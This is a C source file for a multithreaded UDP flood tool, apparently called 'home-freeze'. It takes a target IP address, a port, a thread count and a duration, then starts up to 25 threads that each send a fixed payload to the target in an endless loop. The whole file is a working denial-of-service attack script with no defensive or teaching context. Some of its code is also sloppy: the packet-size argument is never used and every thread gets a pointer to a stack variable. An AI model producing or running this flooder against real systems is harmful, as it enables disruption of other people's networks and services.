#include <stdio.h> 
#include <stdlib.h> 
#include <unistd.h> 
#include <string.h> 
#include <sys/types.h> 
#include <sys/socket.h> 
#include <arpa/inet.h> 
#include <netinet/in.h>
#include <stdbool.h>
#include <pthread.h>

#define MAX_BUFF 1024
#define MAX_PORT 65525
#define MAX_TIME 200 
#define MAX_THREADS 25

#define FAILURE_EXIT_CODE -1

struct attack_arg {
    char* ip_address;
    int port;
    int psize;
    int time;
};

void* attack(void* arguments){
    struct attack_arg *args = (struct attack_arg *)arguments;
    printf("[+] Attacking %s on port %d\n",args->ip_address, args->port);

    int sockfd; 
    char buffer[1024]; 
    char *msg = "074e48c8e3c0bc19f9e22dd7570037392e5d0bf80cf9dd51bb7808872a511b3c1cd91053fca873a4cb7b2549ec1010a9a1a4c2a6aceead9d115eb9d60a1630e056f3accb10574cd563371296d4e4e898941231d06d8dd5de35690c4ba94ca12729aa316365145f8a00c410a859c40a46bbb4d5d51995241eec8f6b7a90415e"; 
    struct sockaddr_in     servaddr; 
    
    if ( (sockfd = socket(AF_INET, SOCK_DGRAM, 0)) < 0 ) { 
        perror("socket creation failed"); 
        exit(EXIT_FAILURE); 
    } 
    
    memset(&servaddr, 0, sizeof(servaddr)); 
        
    servaddr.sin_family = AF_INET; 
    servaddr.sin_port = htons(args->port); 
    servaddr.sin_addr.s_addr = inet_addr(args->ip_address);
        
    int n, len; 
    
    while(true){
    sendto(sockfd, (const char *)msg, strlen(msg), 
        MSG_CONFIRM, (const struct sockaddr *) &servaddr,  
            sizeof(servaddr));  
    }
}
bool validIP(char *ip)
{
    struct sockaddr_in sk;
    int res = inet_pton(AF_INET, ip, &sk.sin_addr);
    return res != 0;
}

int main(int argc, char* argv[]){
    
    if(argc != 6){
        printf("Failure ./home-freeze.c <ip> <port> <psize> <threads> <time> %d",argc);
    }
    // Check cli args
    
    char* ip = argv[1];
    int port = atoi(argv[2]);
    int psize = atoi(argv[3]);
    int threads = atoi(argv[4]);
    int time = atoi(argv[5]);
    int i;

    if(psize > MAX_BUFF){
        printf("Max psize %d",MAX_BUFF);
    }

    if(port <= MAX_PORT && port > 0){
        if(threads <= MAX_THREADS && threads > 0){
            if(time <= MAX_TIME){
                printf("Creating %d threads",threads);
                for(i = 0; i < threads; i++){          
                    pthread_t thr_id;

                    struct attack_arg pthread_args;

                    pthread_args.ip_address = ip;
                    pthread_args.port = port;
                    pthread_args.psize = psize;
                    pthread_args.time = time;

                    if(pthread_create(&thr_id, NULL, &attack, (void *)&pthread_args) == 0){
                        printf("Started thread %d\n",i);
                    }
                }
            }
            else{
                printf("Exceeded time limit");
                return FAILURE_EXIT_CODE;
            }
        }else{
            printf("Invalid thread limit (> 0 && <= 25)%d",threads);
            return FAILURE_EXIT_CODE;
        }
    }
    else{
        printf("Invalid port 1-%d",MAX_PORT);
        return FAILURE_EXIT_CODE;
    }
    
    sleep(time);
    return 0;
}
